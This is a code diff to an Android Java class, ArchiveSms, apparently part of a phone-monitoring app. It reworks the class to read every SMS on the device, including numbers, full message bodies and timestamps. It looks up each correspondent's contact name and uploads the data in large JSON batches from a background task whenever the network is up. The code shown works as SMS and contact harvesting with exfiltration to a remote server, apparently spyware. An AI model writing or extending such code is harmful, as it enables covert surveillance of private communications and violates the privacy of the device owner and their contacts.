@@ -3,6 +3,7 @@ package com.inet.android.archive;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
@@ -10,6 +11,7 @@ import android.database.Cursor;
 import android.net.Uri;
 import android.os.AsyncTask;
 import android.preference.PreferenceManager;
+import android.provider.ContactsContract.PhoneLookup;
 
 import com.inet.android.request.OnDemandRequest;
 import com.inet.android.utils.ConvertDate;
@@ -26,7 +28,7 @@ public class ArchiveSms extends AsyncTask<Context, Void, Void> {
 	private String LOG_TAG = "Arhive SMS";
 	private String sendStr = null;
 	private String complete;
-	private String iType;
+	private String iType = "2";;
 	private Uri uri;
 	private Cursor sms_sent_cursor;
 	Editor ed;
@@ -35,28 +37,20 @@ public class ArchiveSms extends AsyncTask<Context, Void, Void> {
 	public void getSmsLogs() {
 
 		date = new ConvertDate();
+		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
+		ed = sp.edit();
+
 		// -------------- for---------------------------------------------
-		for (int i = 0; i < 2; i++) {
+
+		uri = Uri.parse("content://sms");
+
+		sms_sent_cursor = mContext.getContentResolver().query(uri, null, null,
+				null, "date desc");
+		Logging.doLog(LOG_TAG,
+				"network" + sp.getBoolean("network_available", true), "network"
+						+ sp.getBoolean("network_available", true));
+		if (sp.getBoolean("network_available", true) == true) {
 			complete = "0";
-			switch (i) {
-			case (0):
-				uri = Uri.parse("content://sms/inbox");
-
-				sms_sent_cursor = mContext.getContentResolver().query(uri,
-						null, null, null, null);
-				iType = "4";
-				break;
-			case (1):
-				uri = Uri.parse("content://sms/sent");
-
-				sms_sent_cursor = mContext.getContentResolver().query(uri,
-						null, null, null, null);
-				iType = "5";
-
-				break;
-
-			}
-
 			// Read the sms data and store it in the list
 			if (sms_sent_cursor != null) {
 				// формируем JSONobj
@@ -64,28 +58,42 @@ public class ArchiveSms extends AsyncTask<Context, Void, Void> {
 
 				if (sms_sent_cursor.moveToFirst()) {
 
-					for (int j = 0; j < sms_sent_cursor.getCount(); j++) {
-						// Type of call retrieved from the cursor.
-//						Logging.doLog(
-//								LOG_TAG,
-//								sms_sent_cursor.getString(sms_sent_cursor
-//										.getColumnIndex("address"))
-//										+ sms_sent_cursor.getString(sms_sent_cursor
-//												.getColumnIndex("body"))
-//										+ date.getData(sms_sent_cursor.getLong(sms_sent_cursor
-//												.getColumnIndexOrThrow("date"))));
+					for (int i = 0; i < sms_sent_cursor.getCount(); i++) {
 
+						int typeSms = sms_sent_cursor.getInt(sms_sent_cursor
+								.getColumnIndex("type"));
+						String type = "0";
+						switch (typeSms) {
+						case 1:
+							type = "5";
+							break;
+						case 2:
+							type = "6";
+							break;
+						default:
+							type = "7";
+							break;
+						}
 						try {
 							archiveSMSJson
 									.put("time",
 											date.getData(sms_sent_cursor.getLong(sms_sent_cursor
 													.getColumnIndexOrThrow("date"))));
+							archiveSMSJson.put("type", type);
 							archiveSMSJson.put("number", sms_sent_cursor
 									.getString(sms_sent_cursor
 											.getColumnIndex("address")));
 							archiveSMSJson.put("data", sms_sent_cursor
 									.getString(sms_sent_cursor
 											.getColumnIndex("body")));
+							archiveSMSJson
+									.put("name",
+											getContactName(
+													mContext,
+													sms_sent_cursor
+															.getString(sms_sent_cursor
+																	.getColumnIndex("address"))));
+
 							if (sendStr == null)
 								sendStr = archiveSMSJson.toString();
 							else
@@ -95,33 +103,31 @@ public class ArchiveSms extends AsyncTask<Context, Void, Void> {
 							// TODO Автоматически созданный блок catch
 							e.printStackTrace();
 						}
-						if (sendStr.length() >= 10000) {
-							Logging.doLog(LOG_TAG, "str >= 10000 ..",
-									"str >= 10000 ..");
+						if (sendStr.length() >= 50000) {
+							Logging.doLog(LOG_TAG, "str >= 50000 ..",
+									"str >= 50000 ..");
 							sendRequest(sendStr, complete);
 							sendStr = null;
 						}
 						sms_sent_cursor.moveToNext();
 					}
-					complete = "1";
-					Logging.doLog(LOG_TAG, "Send complete 1 ..",
-							"Send complete 1 ..");
-					sendRequest(sendStr, complete);
-					sendStr = null;
+
 				}
-				Logging.doLog(LOG_TAG, "statusSMSList 0.", "statusSMSList 0.");
-
-				sp = PreferenceManager.getDefaultSharedPreferences(mContext);
-				ed = sp.edit();
-				ed.putString("statusSMSList", "0");
-				ed.commit();
-
+				complete = "1";
+				Logging.doLog(LOG_TAG, "Send complete 1 ..",
+						"Send complete 1 ..");
+				sendRequest(sendStr, complete);
+				sendStr = null;
+				ed.putString("status_sms_list", "0");
 				sms_sent_cursor.close();
 
 			} else
 				Logging.doLog(LOG_TAG, "Send Cursor is Empty",
 						"Send Cursor is Empty");
 		}
+		ed.putString("status_sms_list", "1");
+		ed.commit();
+
 	}
 
 	private void sendRequest(String str, String complete) {
@@ -132,12 +138,31 @@ public class ArchiveSms extends AsyncTask<Context, Void, Void> {
 		}
 	}
 
+	public String getContactName(Context context, String phoneNumber) {
+		ContentResolver cr = mContext.getContentResolver();
+		Uri uri = Uri.withAppendedPath(PhoneLookup.CONTENT_FILTER_URI,
+				Uri.encode(phoneNumber));
+		Cursor cursor = cr.query(uri,
+				new String[] { PhoneLookup.DISPLAY_NAME }, null, null, null);
+		if (cursor == null) {
+			return null;
+		}
+		String contactName = null;
+		if (cursor.moveToFirst()) {
+			contactName = cursor.getString(cursor
+					.getColumnIndex(PhoneLookup.DISPLAY_NAME));
+		}
+		if (cursor != null && !cursor.isClosed()) {
+			cursor.close();
+		}
+		return contactName;
+	}
+
 	@Override
 	protected Void doInBackground(Context... params) {
 		// TODO Автоматически созданная заглушка метода
 		Logging.doLog(LOG_TAG, "doIn");
 		this.mContext = params[0];
-		Logging.doLog(LOG_TAG, mContext.toString());
 		getSmsLogs();
 		return null;
 	}
